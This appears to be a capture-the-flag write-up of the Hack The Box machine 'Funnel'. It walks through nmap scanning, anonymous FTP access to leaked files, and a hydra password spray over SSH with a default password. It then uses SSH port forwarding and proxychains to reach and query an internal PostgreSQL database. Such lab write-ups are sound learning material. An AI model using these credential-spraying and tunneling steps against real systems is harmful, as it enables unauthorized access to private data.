---
layout: single
title: "Funnel htb"
date: 2024-01-30
classes: wide
header:
  teaser: /assets/images/avatar.jpg
tags:
  - ftp
  - anonymous
  - ssh
  - tunneling
  - local port forwarding
  - ftp
  - anonymous
  - proxychains
  - hydra
---

## Introduction

This box mainly introduce a hands-on method called `tunneling`, which is a protocol that allows the movement data from one network to another, so that the attackers can communicate with internal network. 

**SSH tunneling**: A specific type of tunnel that uses SSH protocol to establish secure connection between two endpoints.

There are 3 types of ssh tunneling:

- **Local Port Forwarding**
Simply forward the traffic from the local port to the remote port
- **Remote Port Forwarding**
Reverse version of local port forwarding
- **Dynamic Port Forwarding**
it uses `SOCKS` protocol within the tunnel, within the tunnel, there is a socks proxy server that built on the local machine to route network traffic through the tunnel.

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled.png)

## Info Collecting

```go
nmap -T4 -A -sV $ti
nmap -sC -sV $ti

-sC: perform default scripts
-sV: display the version info
-T4: agreesive mode, not stealthy
-A: a combination options, referred to agressive mode

```

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%201.png)

The red box frames the directory name that is available on the FTP server. 

> find there is a ftp server running on the server, then try anonymous login
> 

### FTP

```go
ftp <ftp_server_ip>
user: anonymous
password: anonymous
cd mail_backup
get <file_name>
```

> after login, download the leaked files from the anonymous account
> 

```go
echo "10.129.228.195 funnel.htb" | sudo tee -a /etc/hosts
```

```go
cat welcome_28112022 | grep -oE '[a-zA-Z0-9_.-]+@funnel\.htb'

-o means matching part of the content rather than the whole line
-E means using regex
[a-zA-Z0-9_.-]+ means multi(+) chars that matched in range of the square bracket
```

> get the initial password, trying to access by ssh
> 

### sed

```go
ssh $(sed -n 'np' accs)

- `np`: nth line
- `d`: Deletes the line(s) specified by the line number. For example, `4d` deletes the 4th line.
- `s/pattern/replacement/`: Substitutes `pattern` with `replacement` on the specified line(s). For example, `s/foo/bar/` replaces the first occurrence of "foo" with "bar" on the line(s).
- `/^pattern/p`: Prints the line(s) starting with `pattern`. For example, `/^Error/p` prints lines starting with "Error".
- `/pattern/d`: Deletes the line(s) containing `pattern`. For example, `/foo/d` deletes lines containing "foo".
```

> christine’s account still use the initial password, collecting the info in the ssh
> 

## Foothold

### ssh

```go
hydra -L usernames.txt -p 'funnel123#!#' {target_IP} ssh

ifconfig
netstat -ant
ps -ef | grep 

```

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%202.png)

> this container belongs to root, no privilege,
> 

use `ss -tl` command to display the networks sockets, connections, it is a powerful placement for older `netstat`

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%203.png)

### SS

```go
-t tcp connections
-l listening sockets
-a all open network sockets
-u udp connections
-s detailed socket statistics
-e extended socket info
```

## Tunneling

knowing that `postgresql` is open on port `5432`, but there is no `psql` command on target machine, so use ssh tunneling to forward traffic

```go
vul > ssh -L 7654:localhost:5432 christine@funnel.htb
```

```go
att > psql -h 127.0.0.1 -p 7654 -U christine
```

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%204.png)

### psql postgresql

```go
\l list all databases
\c switch database
\dt list all tables in this database
select * from <table_name>
```

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%205.png)

## Appendix

using the  dynamic ssh tunnel

```go
ssh -D 1234 christine@$ti

echo socks5 127.0.0.1 1234 | sudo tee -a /etc/proxychains4.conf

proxychains psql -U chrinstine -h localhost -p 5432
```

![Untitled](/assets/images/Funnel%20a4ccd42d04e446d68cd81e0742cd7241/Untitled%206.png)